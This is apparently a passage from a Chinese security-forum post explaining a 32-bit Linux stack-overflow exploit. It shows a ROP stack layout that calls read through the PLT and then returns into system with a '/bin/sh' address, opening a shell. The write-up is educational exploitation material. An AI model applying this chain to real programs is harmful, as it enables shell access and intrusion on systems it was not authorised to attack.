这个 eip 没办法改变，因为是 call 这个指令带来的，这样就会导致在 read 函数没办法正常读取参数，如果去掉 system_addr，又会导致返回到 call 指令下一条 leave 要执行时，ebp 会指向一个 padding，这是在 read 函数中变成的，从而导致 leave 指令也出错。

2. 但是如果直接调用 read_plt，栈中结构为：

```
#注释头
 
padding
read_plt_addr
system_addr
fd
binsh_addr
size

```

这样 Read 函数读取完之后，返回时就会直接调用 system_addr，完全不用管 ebp 变成了什么，同时这里也可以直接将 binsh_addr 传给 system，一举两得。

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)

[第五届安全开发者峰会（SDC 2021）议题征集正式开启！](https://bbs.pediy.com/thread-266645.htm)

最后于 3 分钟前 被 PIG-007 编辑 ，原因：

[#漏洞分析](forum-150-1-153.htm) [#漏洞利用](forum-150-1-154.htm) [#Linux](forum-150-1-161.htm)